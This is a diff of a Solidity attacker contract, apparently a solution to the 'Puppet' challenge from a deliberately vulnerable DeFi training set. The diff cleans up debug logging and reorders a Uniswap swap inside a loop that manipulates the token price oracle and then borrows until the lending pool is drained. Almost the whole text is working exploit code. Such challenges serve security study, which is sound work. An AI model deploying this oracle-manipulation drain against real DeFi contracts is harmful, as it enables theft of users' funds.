@@ -3,16 +3,7 @@ pragma solidity ^0.8.0;
 import "solmate/src/tokens/ERC20.sol";
 
 import {PuppetPool} from "./PuppetPool.sol";
-import "hardhat/console.sol";
 import {IUniswapExchange} from "./IUniswapExchange.sol";
-
-// interface IPuppetPool {
-//     function borrow(uint256 amount, address recipient) external payable;
-
-//     function calculateDepositRequired(
-//         uint256 amount
-//     ) external view returns (uint256);
-// }
 
 contract PuppetPoolAttacker {
     address owner;
@@ -35,11 +26,9 @@ contract PuppetPoolAttacker {
     }
 
     function attack() external {
-        //we have 1000 DVT first
         //approve to uniswap
-        ERC20(token).approve(uniswapPair, 10000000 ether);
+        ERC20(token).approve(uniswapPair, type(uint256).max);
         while (ERC20(token).balanceOf(puppetPool) > 0) {
-            console.log("counter:", counter);
 
             uint256 poolTokenBalance = ERC20(token).balanceOf(puppetPool);
             uint256 amountEtherRequireToDrainPool = PuppetPool(puppetPool)
@@ -48,11 +37,12 @@ contract PuppetPoolAttacker {
             uint256 currentTokenBalanceOfThis = ERC20(token).balanceOf(
                 address(this)
             );
-            console.log(
-                address(this).balance,
-                poolTokenBalance,
-                amountEtherRequireToDrainPool,
-                currentTokenBalanceOfThis
+
+            //swap
+            IUniswapExchange(uniswapPair).tokenToEthSwapInput(
+                currentTokenBalanceOfThis,
+                1,
+                block.timestamp + 10
             );
 
             //if we can drain it, drain
@@ -62,12 +52,6 @@ contract PuppetPoolAttacker {
                     address(this)
                 );
             } else {
-                //swap
-                IUniswapExchange(uniswapPair).tokenToEthSwapInput(
-                    currentTokenBalanceOfThis,
-                    1,
-                    block.timestamp + 10
-                );
                 uint256 amount = (address(this).balance * poolTokenBalance) /
                     amountEtherRequireToDrainPool;
                 //borrow
